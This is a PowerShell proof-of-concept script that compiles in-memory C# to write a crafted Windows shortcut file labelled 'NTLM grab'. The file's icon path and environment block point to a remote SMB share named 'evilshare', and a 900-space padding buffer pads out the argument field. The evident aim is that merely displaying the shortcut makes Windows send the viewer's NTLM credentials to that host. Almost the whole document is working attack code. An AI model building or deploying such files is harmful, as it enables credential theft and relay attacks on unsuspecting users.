# Make‑Lnk.ps1  ─ Build an NTLM‑leaking .LNK via in‑memory C#

$lnkPath   = "poc.lnk"
$iconPath  = "\\\\192.168.254.43\\evilshare\\test.exe,0"
$envUNC    = "\\\\192.168.254.43\\evilshare\\test.exe"
$desc      = "NTLM grab"

$src = @"
using System;
using System.IO;
using System.Runtime.InteropServices;

public class LnkBuilder
{
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct SHELL_LINK_HEADER
    {
        public uint  HeaderSize;
        public uint  LinkCLSID1;
        public ushort LinkCLSID2;
        public ushort LinkCLSID3;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] LinkCLSID4;
        public uint  LinkFlags;
        public uint  FileAttrs;
        public long  CreationTime;
        public long  AccessTime;
        public long  WriteTime;
        public uint  FileSize;
        public uint  IconIndex;
        public uint  ShowCmd;
        public ushort HotKey;
        public ushort Reserved1;
        public uint  Reserved2;
        public uint  Reserved3;
    }

    const uint HAS_NAME          = 0x00000004;
    const uint HAS_ARGUMENTS     = 0x00000020;
    const uint HAS_ICON_LOCATION = 0x00000040;
    const uint IS_UNICODE        = 0x00000080;
    const uint HAS_EXP_STRING    = 0x00000200;

    const uint ENV_BLOCK_SIG     = 0xA0000001;

    public static void Build(string path, string iconPath, string envUNC, string desc)
    {
        using(var fs = new FileStream(path, FileMode.Create, FileAccess.Write))
        using(var bw = new BinaryWriter(fs))
        {
            // --- Header ---
            var hdr = new SHELL_LINK_HEADER();
            hdr.HeaderSize = 0x4C;
            hdr.LinkCLSID1 = 0x00021401;
            hdr.LinkCLSID2 = 0;
            hdr.LinkCLSID3 = 0;
            hdr.LinkCLSID4 = new byte[]{0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46};
            hdr.LinkFlags  = HAS_NAME|HAS_ARGUMENTS|HAS_ICON_LOCATION|IS_UNICODE|HAS_EXP_STRING;
            hdr.FileAttrs  = 0x00000020;                 // FILE_ATTRIBUTE_ARCHIVE
            hdr.CreationTime = hdr.AccessTime = hdr.WriteTime = DateTime.Now.ToFileTimeUtc();
            hdr.ShowCmd   = 1;                           // SW_SHOWNORMAL

            int size = Marshal.SizeOf(hdr);
            byte[] buf = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(hdr, ptr, true);
            Marshal.Copy(ptr, buf, 0, size);
            Marshal.FreeHGlobal(ptr);
            bw.Write(buf);

            // --- Description (Unicode) ---
            WriteUnicodeString(bw, desc);

            // --- Padding cmd buffer (900 spaces) ---
            bw.Write((ushort)900);
            bw.Write(new string(' ',900).ToCharArray());

            // --- Icon Location (Unicode) ---
            WriteUnicodeString(bw, iconPath);

            // --- ENV block ---
            bw.Write(0x00000314u);        // Block size
            bw.Write(ENV_BLOCK_SIG);      // Signature
            WriteFixedAnsi(bw, envUNC, 260);
            WriteFixedUnicode(bw, envUNC, 260);

            bw.Flush();
        }
    }

    static void WriteUnicodeString(BinaryWriter bw,string s)
    {
        var bytes = System.Text.Encoding.Unicode.GetBytes(s);
        bw.Write((ushort)(s.Length));  // length in WCHARs, not including null
        bw.Write(bytes);
    }
    static void WriteFixedAnsi(BinaryWriter bw,string s,int len)
    {
        var b = System.Text.Encoding.ASCII.GetBytes(s);
        Array.Resize(ref b,len);
        bw.Write(b);
    }
    static void WriteFixedUnicode(BinaryWriter bw,string s,int len)
    {
        var b = System.Text.Encoding.Unicode.GetBytes(s);
        Array.Resize(ref b,len*2);
        bw.Write(b);
    }
}
"@

Add-Type -TypeDefinition $src -Language CSharp

[LnkBuilder]::Build($lnkPath, $iconPath, $envUNC, $desc)
Write-Host "poc.lnk written to $(Resolve-Path $lnkPath)"
